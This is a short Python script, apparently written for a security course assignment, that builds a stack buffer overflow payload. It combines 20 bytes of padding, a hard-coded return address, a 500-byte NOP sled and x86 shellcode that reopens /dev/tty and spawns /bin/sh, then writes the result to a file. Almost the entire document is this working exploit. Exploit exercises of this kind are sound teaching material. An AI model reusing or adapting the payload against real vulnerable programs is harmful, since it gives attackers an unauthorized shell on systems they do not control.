# shell_attack.py
import sys

def create_shellcode_payload():
    # Assignment-provided shellcode (single-line, no newlines)
    shellcode = (
        b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9"
        b"\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3"
        b"\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
    )
    
    padding = b"A" * 20      # Buffer (8) + EBP (4) + alignment (8)
    nop_sled = b"\x90" * 500 # Large NOP sled for reliability
    ret_address = b"\xc0\xd7\xff\xff"  # Adjusted return address (0xffffd7c0)
    payload = padding + ret_address + nop_sled + shellcode

    with open("shell_string", "wb") as f:
        f.write(payload)

if __name__ == "__main__":
    create_shellcode_payload()